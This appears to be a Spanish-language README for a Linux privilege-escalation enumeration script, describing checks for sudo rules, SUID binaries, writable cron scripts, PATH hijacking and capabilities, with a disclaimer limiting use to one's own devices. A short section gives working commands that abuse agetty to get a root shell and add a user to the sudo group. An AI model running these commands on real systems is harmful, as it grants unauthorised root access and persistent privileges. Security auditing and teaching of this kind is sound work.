# linuxEscalationScript

## DISCLAIMER

LEER [LICENCIA](./LICENSE)

USA SOLO EN DISPOSITIVOS DE TU PROPIEDAD.
NO ASUMO RESPONSABILIDAD DE USO INDEBIDO.

UTILIZAR ESTE SCRIPT O ESTOS COMANDOS DE ESCALADA DE PRIVILEGIOS EN SISTEMAS EN LOS QUE NO HAS SIDO AUTORIZADO PUEDE SUPONER UN ACTO ILEGAL. NO ME HAGO RESPONSABLE DE DICHOS ACTOS. USA ESTE REPOSITORIO PARA FINES EDUCATIVOS O INVESTIGATIVOS EN TU PROPIEDAD, NO EN LA DE LOS DEMÁS.

### Como ejecutar

Ejecuta en la terminal:
```bash
python3 privesc_enum.py 2>/dev/null
```

### Que analiza

1\. `sudo -l`

- Las reglas de `sudo` mal configuradas son el hallazgo más común en auditorías de seguridad reales.

2\. Binarios SUID

- GTFOBins incluye técnicas para aprovechar decenas de estos binarios y conseguir una escalada de privilegios.

3\. Scripts de cron con permisos de escritura

- Si un script programado se ejecuta como `root` y puede modificarse, puede permitir una escalada de privilegios inmediata.

4\. Secuestro de la variable PATH

- Los directorios con permisos de escritura dentro de `PATH` permiten suplantar binarios legítimos.

5\. Capacidades de Linux (Capabilities)

- Capacidades como `cap_setuid` asignadas a programas como Python o Vim pueden permitir obtener privilegios elevados.


### Caso especifico con agetty

En terminal, ejecutar:

`agetty -l /bin/sh -o -p -a root tty`

despues en la nueva terminal root:

`usermod -aG sudo user` siendo `user` el usuario al que se desea conceder sudo.

`exit`

una vez de vuelta en la terminal normal:

`su - user`

#### Más

[GTFObins](https://gtfobins.org/)
